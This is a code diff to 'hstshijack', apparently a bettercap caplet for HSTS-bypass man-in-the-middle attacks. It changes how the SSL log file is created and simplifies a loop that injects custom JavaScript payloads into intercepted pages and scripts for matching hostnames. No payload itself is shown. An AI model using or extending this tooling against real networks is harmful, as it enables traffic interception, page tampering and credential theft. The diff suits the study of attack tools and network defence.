@@ -242,10 +242,11 @@ function onLoad() {
 	var_replacement_hosts = randomString( 4 + Math.random() * 12 )
 
 	log_info("(" + green + "hstshijack" + reset + ") Reading SSL log ...")
-	ssl_log = readFile( env["hstshijack.log"] ).split("\n")
 	if ( !readFile( env["hstshijack.log"] ) ) {
-		log_warn("(" + green + "hstshijack" + reset + ") No " + bold + "ssl.log" + reset + " file found. Logged hosts will be lost when this session ends!")
+		log_info("(" + green + "hstshijack" + reset + ") No SSL log file found, creating one now ...")
+		writeFile(env["hstshijack.log"], "")
 	}
+	ssl_log = readFile( env["hstshijack.log"] ).split("\n")
 
 	log_info("(" + green + "hstshijack" + reset + ") Reading caplet ...")
 	configure()
@@ -571,19 +572,17 @@ function onResponse(req, res) {
 		if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) || res.Body.match(/<head>/i) ) {
 			injection = ""
 
-			if ( Object.keys(custom_payloads).length > 0 ) {
-				for ( var a = 0; a < Object.keys(custom_payloads).length; a++ ) {
-					var regexp
-					if ( Object.keys(custom_payloads)[a].indexOf("*") > -1 ) {
-						regexp = toWholeWildcardRegexp( Object.keys(custom_payloads)[a] )
-					} else {
-						regexp = toWholeRegexp( Object.keys( custom_payloads)[a] )
-					}
-					if ( req.Hostname.match(regexp) ) {
-						// Insert special callback paths.
-						injection = payload.replace("{{custom_payload}}", Object.keys(custom_payloads)[a].payload + "\n{{custom_payload}}")
-						log_debug("(" + green + "hstshijack" + reset + ") Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
-					}
+			for ( var a = 0; a < Object.keys(custom_payloads).length; a++ ) {
+				var regexp
+				if ( Object.keys(custom_payloads)[a].indexOf("*") > -1 ) {
+					regexp = toWholeWildcardRegexp( Object.keys(custom_payloads)[a] )
+				} else {
+					regexp = toWholeRegexp( Object.keys( custom_payloads)[a] )
+				}
+				if ( req.Hostname.match(regexp) ) {
+					// Insert special callback paths.
+					injection = payload.replace("{{custom_payload}}", Object.keys(custom_payloads)[a].payload + "\n{{custom_payload}}")
+					log_debug("(" + green + "hstshijack" + reset + ") Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
 				}
 			}
 
